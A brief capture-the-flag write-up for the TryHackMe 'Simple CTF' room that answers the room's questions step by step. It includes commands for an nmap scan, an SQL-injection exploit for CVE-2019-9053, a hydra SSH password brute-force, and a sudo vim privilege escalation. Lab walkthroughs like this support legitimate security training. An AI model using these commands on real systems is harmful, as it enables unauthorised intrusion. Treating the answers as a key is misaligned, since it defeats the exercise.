
# THM-Simple CTF write-up
**Simple CTF**

https://tryhackme.com/room/easyctf

**Task 1 Simple CTF**

 
**How many services are running under port 1000?**

 ~#nmap -A [IP Address] -oA scan.txt
  
A. 2


 
**What is running on the higher port?** 

A. SSH


**What's the CVE you're using against the application?**


A. CVE-2019-9053


**To what kind of vulnerability is the application vulnerable?**

A. SQLi


**What's the password?**

    ~#python 46635.py -u http://10.10.176.184/simple/ --crack -w /usr/share/wordlists/dirb/common.txt
  
  ~#hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.176.184:2222



**Where can you login with the details obtained?**


    ~# ssh -p2222 mitch@10.10.176.184

**What's the user flag?**




**Is there any other user in the home directory? What's its name?**

sunbath


**What can you leverage to spawn a privileged shell?**

   ~#sudo -l
 
A. VIM

**What's the root flag?**






